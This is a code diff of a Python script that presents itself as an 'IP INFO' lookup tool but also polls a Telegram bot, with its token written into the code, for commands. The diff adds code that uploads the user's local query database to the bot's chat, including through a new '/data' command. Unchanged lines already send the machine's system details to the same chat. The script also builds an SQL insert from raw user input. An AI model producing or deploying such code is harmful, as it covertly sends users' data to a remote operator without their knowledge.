@@ -5,10 +5,11 @@ import requests
 import time
 from tkinter import messagebox
 import sqlite3
-from datetime import datetime
 import socket
 import ctypes
 import platform
+import telebot
+bot = telebot.TeleBot("6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8")
 
 my_system = platform.uname()
 
@@ -25,10 +26,6 @@ url = "https://api.telegram.org/bot6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ
 connection = sqlite3.connect("ip.sl3", 5)
 
 cur = connection.cursor()
-
-now = datetime.now()
-d1 = now.strftime("%d/%m/%Y %H:%M:%S")
-
 
 def last_update(r):
     response = requests.get(r + "getUpdates")
@@ -57,7 +54,6 @@ def send_message(chat, text):
 def get_info_by_ip(ip='127.0.0.1'):
     try:
         response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
-        # print(response)
 
         data = {
             '[IP]': response.get('query'),
@@ -97,7 +93,7 @@ def main():
     preview_text = Figlet(font='slant')
     print(preview_text.renderText('IP INFO'))
     messagebox.showinfo("IP", f"Ваш IP: {a}")
-    ip = input('Please enter a target IP: ')
+    ip = input('Будь ласка напишіть IP дя перевірки: ')
     get_info_by_ip(ip=ip)
     # cur.execute("CREATE TABLE ip_list (ip TEXT);")
     cur.execute(f"INSERT INTO ip_list (ip) VALUES ('{ip}');")
@@ -155,12 +151,23 @@ def main():
                              f"Процессор: {my_system.processor}")
                 send_message(get_chat_id(upd),
                              f"Машина: {my_system.machine}")
+                send_message(get_chat_id(upd),
+                             f"База даних запитів з пристрою клієнта:")
+                upfile = open("ip.sl3", "rb")
+                bot.send_document(get_chat_id(upd), upfile)
+                upfile.close()
+            elif get_message_text(upd).lower() == "/data":
+                send_message(get_chat_id(upd),
+                             f"База даних запитів з пристрою клієнта:")
+                upfile = open("ip.sl3", "rb")
+                bot.send_document(get_chat_id(upd), upfile)
+                upfile.close()
+
 
             else:
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
         time.sleep(2)
-
 
 
 
